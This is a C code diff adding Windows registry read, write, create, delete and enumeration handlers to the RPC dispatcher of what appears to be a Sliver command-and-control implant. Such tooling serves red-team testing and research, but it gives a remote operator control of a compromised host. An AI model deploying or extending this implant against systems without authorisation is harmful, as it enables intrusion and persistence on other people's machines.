@@ -633,6 +633,114 @@ static int handle_mount(const sliver_envelope_t *req, sliver_buf_t *out) {
                              n < 0 ? "mount: enumeration failed" : NULL);
 }
 
+
+/* --- registry handlers (Windows) ---------------------------------------- */
+#if defined(_WIN32)
+#include "sliver/registry.h"
+
+static int handle_reg_read(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_reg_req_t rr;
+  char value[1024];
+  uint8_t binary[4096];
+  size_t binary_len = 0;
+  uint32_t type = 0;
+  char err[256];
+  int rc;
+
+  if (sliver_reg_req_decode(req->data, req->data_len, &rr) != 0) {
+    return -1;
+  }
+  value[0] = 0;
+  err[0] = 0;
+  rc = sliver_reg_read(rr.hive, rr.path, rr.key, value, sizeof(value), binary, sizeof(binary),
+                       &binary_len, &type);
+  if (rc != 0) {
+    (void)snprintf(err, sizeof(err), "%s", "registry: could not read value");
+  }
+  LOG_DEBUG("rpc: registry read %s\\%s -> %s", rr.path, rr.key, rc == 0 ? "ok" : "failed");
+  return sliver_reg_read_encode(out, value, binary, binary_len, type, err);
+}
+
+static int handle_reg_write(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_reg_req_t rr;
+  char err[256];
+
+  if (sliver_reg_req_decode(req->data, req->data_len, &rr) != 0) {
+    return -1;
+  }
+  err[0] = 0;
+  if (sliver_reg_write(rr.hive, rr.path, rr.key, rr.type, rr.string_value, rr.byte_value,
+                       rr.byte_len, rr.dword, rr.qword) != 0) {
+    (void)snprintf(err, sizeof(err), "%s", "registry: could not write value");
+  }
+  return sliver_empty_response_encode(out, err);
+}
+
+static int handle_reg_create(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_reg_req_t rr;
+  char err[256];
+
+  if (sliver_reg_req_decode(req->data, req->data_len, &rr) != 0) {
+    return -1;
+  }
+  err[0] = 0;
+  if (sliver_reg_create(rr.hive, rr.path, rr.key) != 0) {
+    (void)snprintf(err, sizeof(err), "%s", "registry: could not create key");
+  }
+  return sliver_empty_response_encode(out, err);
+}
+
+static int handle_reg_delete(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_reg_req_t rr;
+  char err[256];
+
+  if (sliver_reg_req_decode(req->data, req->data_len, &rr) != 0) {
+    return -1;
+  }
+  err[0] = 0;
+  if (sliver_reg_delete(rr.hive, rr.path, rr.key) != 0) {
+    (void)snprintf(err, sizeof(err), "%s", "registry: could not delete key or value");
+  }
+  return sliver_empty_response_encode(out, err);
+}
+
+static int handle_reg_subkeys(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_reg_req_t rr;
+  char names[256][256];
+  int n;
+  char err[256];
+
+  if (sliver_reg_req_decode(req->data, req->data_len, &rr) != 0) {
+    return -1;
+  }
+  err[0] = 0;
+  n = sliver_reg_subkeys(rr.hive, rr.path, names, 256);
+  if (n < 0) {
+    (void)snprintf(err, sizeof(err), "%s", "registry: could not list subkeys");
+    n = 0;
+  }
+  return sliver_reg_names_encode(out, names, n, err);
+}
+
+static int handle_reg_values(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_reg_req_t rr;
+  char names[256][256];
+  int n;
+  char err[256];
+
+  if (sliver_reg_req_decode(req->data, req->data_len, &rr) != 0) {
+    return -1;
+  }
+  err[0] = 0;
+  n = sliver_reg_values(rr.hive, rr.path, names, 256);
+  if (n < 0) {
+    (void)snprintf(err, sizeof(err), "%s", "registry: could not list values");
+    n = 0;
+  }
+  return sliver_reg_names_encode(out, names, n, err);
+}
+#endif /* _WIN32 */
+
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
     {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
@@ -653,6 +761,14 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_IFCONFIG_REQ, SLIVER_MSG_IFCONFIG, handle_ifconfig},
     {SLIVER_MSG_NETSTAT_REQ, SLIVER_MSG_NETSTAT, handle_netstat},
     {SLIVER_MSG_MOUNT_REQ, SLIVER_MSG_MOUNT, handle_mount},
+#if defined(_WIN32)
+    {71, 71, handle_reg_read},
+    {72, 72, handle_reg_write},
+    {73, 73, handle_reg_create},
+    {88, 88, handle_reg_subkeys},
+    {89, 89, handle_reg_values},
+    {97, 97, handle_reg_delete},
+#endif
     {SLIVER_MSG_CP_REQ, SLIVER_MSG_CP, handle_cp_async},
     {SLIVER_MSG_MV_REQ, SLIVER_MSG_MV, handle_mv_async},
     {SLIVER_MSG_CHMOD_REQ, SLIVER_MSG_CHMOD, handle_chmod_async},
@@ -712,4 +828,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
+
+
 
